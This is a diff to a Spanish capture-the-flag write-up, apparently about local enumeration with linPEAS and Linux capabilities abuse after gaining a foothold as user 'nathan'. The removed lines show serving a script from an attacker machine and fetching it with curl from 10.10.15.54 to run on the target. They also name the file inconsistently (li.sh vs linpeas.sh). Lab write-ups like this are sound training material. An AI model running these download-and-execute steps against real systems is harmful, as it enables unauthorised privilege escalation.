@@ -173,28 +173,9 @@ Una vez obtenido acceso como el usuario **nathan**, se procede a la enumeración
 
 ### 5.1 Enumeración con linPEAS
 
-Se despliega un servidor HTTP en la máquina atacante para facilitar la transferencia del script.
+Se realiza enumeración local del sistema utilizando **linPEAS**, transfiriendo el script a la máquina objetivo mediante un servidor HTTP siguiendo el procedimiento estándar documentado en: → [File Transfer – Python HTTP Server](/toolbox/file-transfer/python-http-server)
 
-```bash
-sudo python -m http.server 80
-```
-
-![](img/python3_http.server.png)
-
-
-Desde la máquina objetivo se descarga y ejecuta **linpeas.sh**.
-
-```bash
-curl -X GET http://10.10.15.54/linpeas.sh -o li.sh
-```
-
-![](img/curl_X_GET_linpeas.png)
-```bash
-chmod +x linpeas.sh
-./linpeas.sh
-```
-
-Durante la ejecución de linPEAS se identifican varios hallazgos, siendo el más relevante la presencia de **capacidades asignadas a binarios**.
+Durante la ejecución de linPEAS se identifican varios hallazgos, destacando la presencia de **[Linux capabilities](/toolbox/linux-capabilities-abuse)** mal configuradas en binarios del sistema.
 
 ### 5.2 Linux Capabilities
 
